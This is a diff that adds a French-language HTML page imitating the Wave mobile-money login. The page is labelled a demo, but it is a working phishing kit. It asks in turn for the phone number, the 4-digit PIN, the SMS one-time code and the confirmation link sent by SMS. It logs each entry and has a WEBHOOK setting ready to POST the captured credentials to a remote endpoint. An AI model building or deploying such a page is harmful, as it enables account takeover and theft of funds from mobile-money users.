@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Wave — Connexion (démo)</title>
+<style>
+  :root{
+    --wave:#1DC8FF; --wave-dark:#0A87C9; --navy:#0B2545;
+    --muted:#6B7A90; --line:#DDE5EE; --err:#E5484D; --ok:#12A594;
+  }
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{
+    margin:0;min-height:100vh;display:grid;place-items:center;padding:16px;
+    font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;
+    color:var(--navy);
+    background:radial-gradient(1200px 600px at 50% -10%,#DDF3FF 0%,#EDF3F9 55%,#E6EEF6 100%);
+  }
+  .card{
+    width:min(420px,100%);background:#fff;border-radius:26px;padding:20px 22px 26px;
+    box-shadow:0 24px 60px rgba(11,37,69,.16);position:relative;overflow:hidden;
+  }
+  /* --- barre du haut --- */
+  .topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;min-height:32px}
+  .back{
+    border:0;background:transparent;width:32px;height:32px;border-radius:10px;cursor:pointer;
+    display:grid;place-items:center;color:var(--navy);opacity:0;transition:opacity .2s,background .15s;
+  }
+  .back.show{opacity:1}
+  .back:hover{background:#F1F6FB}
+  .help{border:0;background:#F1F6FB;color:var(--muted);font-size:12.5px;font-weight:600;
+    padding:7px 12px;border-radius:999px;cursor:pointer}
+  .help:hover{background:#E7F0F8}
+  /* --- logo --- */
+  .brand{display:flex;align-items:center;gap:10px;margin-bottom:18px}
+  .brand .logo{width:42px;height:42px;border-radius:13px;background:var(--wave);
+    display:grid;place-items:center;box-shadow:0 8px 18px rgba(29,200,255,.35)}
+  .brand .name{font-size:22px;font-weight:800;letter-spacing:-.4px}
+  /* --- progression --- */
+  .dots{display:flex;gap:6px;margin-bottom:22px}
+  .dots i{flex:1;height:4px;border-radius:3px;background:var(--line);transition:background .25s}
+  .dots i.on{background:var(--wave)}
+  /* --- étapes --- */
+  .step{display:none;animation:in .28s ease both}
+  .step.active{display:block}
+  @keyframes in{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+  h1{font-size:22px;line-height:1.25;margin:0 0 8px;letter-spacing:-.5px}
+  p.sub{margin:0 0 20px;color:var(--muted);font-size:14.5px;line-height:1.5}
+  p.sub b{color:var(--navy);font-weight:700}
+  /* --- champs --- */
+  .field{display:flex;align-items:center;gap:8px;border:1.5px solid var(--line);
+    border-radius:14px;padding:0 12px;height:56px;background:#fff;transition:border-color .15s,box-shadow .15s}
+  .field:focus-within{border-color:var(--wave);box-shadow:0 0 0 4px rgba(29,200,255,.16)}
+  .field.err{border-color:var(--err);box-shadow:0 0 0 4px rgba(229,72,77,.12)}
+  select{border:0;background:transparent;font:inherit;font-size:15px;font-weight:600;
+    color:var(--navy);outline:none;padding:0;cursor:pointer}
+  .sep{width:1px;height:24px;background:var(--line)}
+  .field input{border:0;outline:none;flex:1;font:inherit;font-size:17px;font-weight:600;
+    color:var(--navy);background:transparent;min-width:0;letter-spacing:.5px}
+  .field input::placeholder{color:#A9B7C6;font-weight:500;letter-spacing:0}
+  /* --- OTP --- */
+  .otp{display:flex;gap:10px;justify-content:space-between;margin-bottom:6px}
+  .otp input{
+    flex:1;height:58px;border:1.5px solid var(--line);border-radius:14px;text-align:center;
+    font:inherit;font-size:22px;font-weight:700;color:var(--navy);outline:none;
+    transition:border-color .15s,box-shadow .15s;min-width:0;
+  }
+  .otp input:focus{border-color:var(--wave);box-shadow:0 0 0 4px rgba(29,200,255,.16)}
+  .otp input.filled{border-color:#B9E9FA;background:#F7FCFF}
+  .otp.err input{border-color:var(--err)}
+  /* --- erreurs / liens --- */
+  .error{color:var(--err);font-size:13px;font-weight:600;margin:10px 2px 0;display:none}
+  .error.show{display:block}
+  .row{display:flex;align-items:center;justify-content:space-between;margin-top:14px}
+  .link{border:0;background:transparent;color:var(--wave-dark);font:inherit;font-size:13.5px;
+    font-weight:700;cursor:pointer;padding:4px 2px}
+  .link:disabled{color:#A9B7C6;cursor:not-allowed}
+  .hint{color:var(--muted);font-size:13px}
+  /* --- bouton --- */
+  .btn{width:100%;height:54px;border:0;border-radius:15px;background:var(--wave);color:#04283C;
+    font:inherit;font-size:16.5px;font-weight:800;cursor:pointer;margin-top:22px;
+    box-shadow:0 10px 24px rgba(29,200,255,.34);transition:transform .12s,filter .15s,box-shadow .15s}
+  .btn:hover{filter:brightness(1.04)}
+  .btn:active{transform:scale(.985)}
+  .btn.ghost{background:#F1F6FB;color:var(--navy);box-shadow:none}
+  /* --- succès --- */
+  .success{text-align:center;padding:8px 0 4px}
+  .check{width:76px;height:76px;border-radius:50%;background:#E6F9F5;display:grid;
+    place-items:center;margin:6px auto 18px;animation:pop .35s ease both}
+  @keyframes pop{from{transform:scale(.7);opacity:0}to{transform:scale(1);opacity:1}}
+  /* --- panneau démo --- */
+  .demo-chip{position:fixed;top:14px;right:14px;background:#0B2545;color:#9FE9FF;
+    font:600 11px/1 ui-monospace,monospace;padding:8px 11px;border-radius:999px;border:0;
+    cursor:pointer;letter-spacing:.5px;opacity:.85}
+  .panel{position:fixed;top:52px;right:14px;width:min(340px,calc(100vw - 28px));max-height:60vh;
+    overflow:auto;background:#0B2545;color:#CDEBFF;border-radius:14px;padding:14px;
+    font:12px/1.55 ui-monospace,SFMono-Regular,Menlo,monospace;white-space:pre-wrap;
+    box-shadow:0 18px 40px rgba(11,37,69,.4);display:none}
+  .panel.show{display:block}
+  .panel h4{margin:0 0 8px;font-size:11px;color:#6FD8FF;letter-spacing:1px;text-transform:uppercase}
+  .panel .item{border-top:1px solid #1C3A5A;padding:8px 0}
+  .panel button{margin-top:10px;width:100%;background:#16395C;color:#CDEBFF;border:0;
+    border-radius:8px;padding:8px;font:inherit;cursor:pointer}
+</style>
+</head>
+<body>
+
+<button class="demo-chip" id="chip">DÉMO · LOG</button>
+<div class="panel" id="panel"><h4>Saisies capturées</h4><div id="logBody">—</div>
+  <button id="reset">Réinitialiser</button>
+</div>
+
+<div class="card">
+  <div class="topbar">
+    <button class="back" id="back" aria-label="Retour">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"
+           stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+    </button>
+    <button class="help">Besoin d'aide ?</button>
+  </div>
+
+  <div class="brand">
+    <div class="logo">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4"
+           stroke-linecap="round"><path d="M3 14c2.5 0 2.5-4 5-4s2.5 4 5 4 2.5-4 5-4 2.5 4 3 4"/></svg>
+    </div>
+    <div class="name">wave</div>
+  </div>
+
+  <div class="dots" id="dots"><i class="on"></i><i></i><i></i><i></i></div>
+
+  <form id="form" novalidate>
+
+    <!-- ========== 1. NUMÉRO ========== -->
+    <section class="step active" data-step="0">
+      <h1>Bienvenue sur Wave</h1>
+      <p class="sub">Entre ton numéro de téléphone pour te connecter à ton compte.</p>
+      <div class="field" id="phoneField">
+        <select id="code">
+          <option value="+221" selected>🇸🇳 +221</option>
+          <option value="+225">🇨🇮 +225</option>
+          <option value="+223">🇲🇱 +223</option>
+          <option value="+226">🇧🇫 +226</option>
+          <option value="+237">🇨🇲 +237</option>
+          <option value="+228">🇹🇬 +228</option>
+          <option value="+221">🇬🇳 +224</option>
+          <option value="+33">🇫🇷 +33</option>
+        </select>
+        <div class="sep"></div>
+        <input id="phone" type="tel" inputmode="numeric" autocomplete="tel"
+               placeholder="77 123 45 67" maxlength="15">
+      </div>
+      <div class="error" id="err0">Entre un numéro de téléphone valide.</div>
+      <button class="btn" type="submit">Continuer</button>
+    </section>
+
+    <!-- ========== 2. CODE PIN ========== -->
+    <section class="step" data-step="1">
+      <h1>Entre ton code PIN</h1>
+      <p class="sub">Code secret de <b>4 chiffres</b> lié à ton compte <b id="phoneEcho">+221</b>.</p>
+      <div class="otp" id="pinOtp" data-length="4"></div>
+      <div class="error" id="err1">Le code PIN doit contenir 4 chiffres.</div>
+      <div class="row">
+        <span class="hint">4 chiffres</span>
+        <button class="link" type="button">PIN oublié ?</button>
+      </div>
+      <button class="btn" type="submit">Continuer</button>
+    </section>
+
+    <!-- ========== 3. CODE DE VÉRIFICATION ========== -->
+    <section class="step" data-step="2">
+      <h1>Code de vérification</h1>
+      <p class="sub">Nous avons envoyé un code à <b>6 chiffres</b> au <b id="phoneEcho2">+221</b> par SMS.</p>
+      <div class="otp" id="otpOtp" data-length="6"></div>
+      <div class="error" id="err2">Entre le code à 6 chiffres reçu par SMS.</div>
+      <div class="row">
+        <span class="hint">Le code expire dans <b id="timer">00:45</b></span>
+        <button class="link" type="button" id="resend" disabled>Renvoyer</button>
+      </div>
+      <button class="btn" type="submit">Vérifier</button>
+    </section>
+
+    <!-- ========== 4. LIEN REÇU PAR SMS ========== -->
+    <section class="step" data-step="3">
+      <h1>Lien de confirmation</h1>
+      <p class="sub">Colle le <b>lien reçu par SMS</b> pour finaliser la connexion.</p>
+      <div class="field" id="linkField">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#6B7A90" stroke-width="2"
+             stroke-linecap="round" stroke-linejoin="round" style="flex:none">
+          <path d="M10 13a5 5 0 0 0 7 0l3-3a5 5 0 0 0-7-7l-1.5 1.5"/>
+          <path d="M14 11a5 5 0 0 0-7 0l-3 3a5 5 0 0 0 7 7l1.5-1.5"/>
+        </svg>
+        <input id="link" type="text" inputmode="url" autocomplete="off"
+               placeholder="https://wave.com/v/…" spellcheck="false" style="font-size:15px">
+      </div>
+      <div class="error" id="err3">Le lien ne semble pas valide.</div>
+      <div class="row">
+        <span class="hint">Copie-colle depuis le SMS reçu</span>
+        <button class="link" type="button" id="paste">Coller</button>
+      </div>
+      <button class="btn" type="submit">Se connecter</button>
+    </section>
+
+    <!-- ========== SUCCÈS ========== -->
+    <section class="step" data-step="4">
+      <div class="success">
+        <div class="check">
+          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#12A594" stroke-width="3"
+               stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+        </div>
+        <h1>Connexion réussie</h1>
+        <p class="sub">Fin de la démo — les 4 étapes ont été complétées.</p>
+        <button class="btn ghost" type="button" id="restart">Recommencer</button>
+      </div>
+    </section>
+
+  </form>
+</div>
+
+<script>
+/* =========================================================
+   CONFIG
+   ========================================================= */
+const WEBHOOK = '';        // ex: 'https://ton-endpoint/collect' (POST JSON)
+const $ = s => document.querySelector(s);
+
+let step = 0;
+const data = { code:'+221', phone:'', pin:'', otp:'', link:'' };
+let timerId = null, canResend = false;
+
+/* =========================================================
+   CAPTURE (localStorage + console + webhook optionnel)
+   ========================================================= */
+const log = [];
+function capture(label, payload){
+  log.push({ step, label, payload, ts: new Date().toISOString() });
+  console.log('%c[demo] '+label, 'color:#1DC8FF;font-weight:bold', payload);
+  try { localStorage.setItem('wave_demo_log', JSON.stringify(log)); } catch(e){}
+  if (WEBHOOK) {
+    fetch(WEBHOOK, {
+      method:'POST', mode:'no-cors',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ step, label, ...payload })
+    }).catch(()=>{});
+  }
+  renderLog();
+}
+function renderLog(){
+  $('#logBody').innerHTML = log.length
+    ? log.map(e => `<div class="item"><b style="color:#6FD8FF">${e.step+1}. ${e.label}</b><br>${JSON.stringify(e.payload)}
+        <br><span style="color:#5A7B9C">${new Date(e.ts).toLocaleTimeString()}</span></div>`).join('')
+    : '—';
+}
+$('#chip').onclick  = () => $('#panel').classList.toggle('show');
+$('#reset').onclick = () => { log.length = 0; localStorage.removeItem('wave_demo_log'); renderLog(); };
+
+/* =========================================================
+   NAVIGATION
+   ========================================================= */
+function go(n){
+  step = n;
+  document.querySelectorAll('.step').forEach(s =>
+    s.classList.toggle('active', +s.dataset.step === n));
+  document.querySelectorAll('#dots i').forEach((d,i) =>
+    d.classList.toggle('on', i <= Math.min(n,3)));
+  $('#back').classList.toggle('show', n > 0 && n < 4);
+  window.scrollTo({top:0,behavior:'smooth'});
+  const target = document.querySelector(`.step[data-step="${n}"]`);
+  const first = target && target.querySelector('input');
+  if (first) setTimeout(() => first.focus(), 60);
+  if (n === 2) startTimer();
+}
+$('#back').onclick = () => go(Math.max(0, step - 1));
+
+/* =========================================================
+   OTP : génération des cases
+   ========================================================= */
+function buildOtp(el){
+  const len = +el.dataset.length;
+  const inputs = [];
+  el.innerHTML = '';
+  for (let i = 0; i < len; i++){
+    const inp = document.createElement('input');
+    inp.type = 'text';
+    inp.inputMode = 'numeric';
+    inp.maxLength = 1;
+    inp.autocomplete = 'one-time-code';
+    inp.setAttribute('aria-label', 'chiffre ' + (i+1));
+    el.appendChild(inp);
+    inputs.push(inp);
+
+    inp.addEventListener('input', () => {
+      inp.value = inp.value.replace(/\D/g,'').slice(-1);
+      inp.classList.toggle('filled', !!inp.value);
+      el.classList.remove('err');
+      if (inp.value && i < len-1) inputs[i+1].focus();
+    });
+    inp.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !inp.value && i > 0){
+        inputs[i-1].focus();
+        inputs[i-1].value = '';
+        inputs[i-1].classList.remove('filled');
+      }
+      if (e.key === 'ArrowLeft'  && i > 0)   inputs[i-1].focus();
+      if (e.key === 'ArrowRight' && i < len-1) inputs[i+1].focus();
+    });
+    inp.addEventListener('paste', e => {
+      const raw = (e.clipboardData || window.clipboardData).getData('text');
+      const digits = raw.replace(/\D/g,'').slice(0, len);
+      if (!digits) return;
+      e.preventDefault();
+      inputs.forEach((x,j) => {
+        x.value = digits[j] || '';
+        x.classList.toggle('filled', !!x.value);
+      });
+      inputs[Math.min(digits.length, len) - 1].focus();
+    });
+    inp.addEventListener('focus', () => inp.select());
+  }
+  el.getValue = () => inputs.map(x => x.value).join('');
+  el.clear    = () => { inputs.forEach(x => { x.value=''; x.classList.remove('filled'); }); };
+  el.focusFirst = () => inputs[0].focus();
+}
+
+/* =========================================================
+   UTILITAIRES
+   ========================================================= */
+const digits = s => (s || '').replace(/\D/g,'');
+function fmtPhone(cc, num){
+  const n = digits(num);
+  const groups = n.match(/.{1,2}/g) || [];
+  return `${cc} ${groups.join(' ')}`.trim();
+}
+const setErr = (id, on) => $('#'+id).classList.toggle('show', !!on);
+
+/* =========================================================
+   TIMER RENVOI SMS
+   ========================================================= */
+function startTimer(){
+  clearInterval(timerId);
+  let left = 45;
+  canResend = false;
+  $('#resend').disabled = true;
+  const paint = () => {
+    const m = String(Math.floor(left/60)).padStart(2,'0');
+    const s = String(left%60).padStart(2,'0');
+    $('#timer').textContent = `${m}:${s}`;
+    if (left <= 0){
+      clearInterval(timerId);
+      $('#timer').textContent = 'expiré';
+      canResend = true;
+      $('#resend').disabled = false;
+    }
+    left--;
+  };
+  paint();
+  timerId = setInterval(paint, 1000);
+}
+$('#resend').onclick = () => {
+  if (!canResend) return;
+  capture('Renvoyer le code SMS', { to: fmtPhone(data.code, data.phone) });
+  startTimer();
+};
+
+/* =========================================================
+   COLLER LE LIEN
+   ========================================================= */
+$('#paste').onclick = async () => {
+  try {
+    const txt = await navigator.clipboard.readText();
+    if (txt) { $('#link').value = txt.trim(); setErr('err3', false); }
+  } catch (e) {
+    $('#link').focus();
+  }
+};
+
+/* =========================================================
+   SOUMISSION PAR ÉTAPE
+   ========================================================= */
+$('#form').addEventListener('submit', e => {
+  e.preventDefault();
+
+  /* --- 1. numéro --- */
+  if (step === 0){
+    const n = digits($('#phone').value);
+    if (n.length < 7){
+      setErr('err0', true);
+      $('#phoneField').classList.add('err');
+      return;
+    }
+    setErr('err0', false);
+    $('#phoneField').classList.remove('err');
+    data.code  = $('#code').value;
+    data.phone = n;
+    const full = fmtPhone(data.code, n);
+    $('#phoneEcho').textContent  = full;
+    $('#phoneEcho2').textContent = full;
+    capture('Numéro de téléphone', { phone: data.code + n });
+    go(1);
+    return;
+  }
+
+  /* --- 2. PIN --- */
+  if (step === 1){
+    const v = $('#pinOtp').getValue();
+    if (v.length !== 4){
+      setErr('err1', true);
+      $('#pinOtp').classList.add('err');
+      return;
+    }
+    setErr('err1', false);
+    $('#pinOtp').classList.remove('err');
+    data.pin = v;
+    capture('Code PIN', { phone: data.code + data.phone, pin: v });
+    go(2);
+    return;
+  }
+
+  /* --- 3. OTP --- */
+  if (step === 2){
+    const v = $('#otpOtp').getValue();
+    if (v.length !== 6){
+      setErr('err2', true);
+      $('#otpOtp').classList.add('err');
+      return;
+    }
+    setErr('err2', false);
+    $('#otpOtp').classList.remove('err');
+    data.otp = v;
+    clearInterval(timerId);
+    capture('Code de vérification', { otp: v });
+    go(3);
+    return;
+  }
+
+  /* --- 4. lien --- */
+  if (step === 3){
+    const v = $('#link').value.trim();
+    const looksLikeLink = /^(https?:\/\/|www\.)?[\w.-]+\.[a-z]{2,}(\/\S*)?$/i.test(v);
+    if (!looksLikeLink){
+      setErr('err3', true);
+      $('#linkField').classList.add('err');
+      return;
+    }
+    setErr('err3', false);
+    $('#linkField').classList.remove('err');
+    data.link = v;
+    capture('Lien reçu par SMS', { link: v });
+    go(4);
+  }
+});
+
+/* =========================================================
+   INIT
+   ========================================================= */
+buildOtp($('#pinOtp'));
+buildOtp($('#otpOtp'));
+
+$('#phone').addEventListener('input', e => {
+  const n = digits(e.target.value).slice(0, 12);
+  e.target.value = (n.match(/.{1,2}/g) || []).join(' ');
+  setErr('err0', false);
+  $('#phoneField').classList.remove('err');
+});
+
+$('#restart').onclick = () => {
+  Object.assign(data, { code:'+221', phone:'', pin:'', otp:'', link:'' });
+  $('#phone').value = ''; $('#link').value = ''; $('#code').value = '+221';
+  $('#pinOtp').clear(); $('#otpOtp').clear();
+  clearInterval(timerId);
+  go(0);
+};
+</script>
+</body>
+</html>
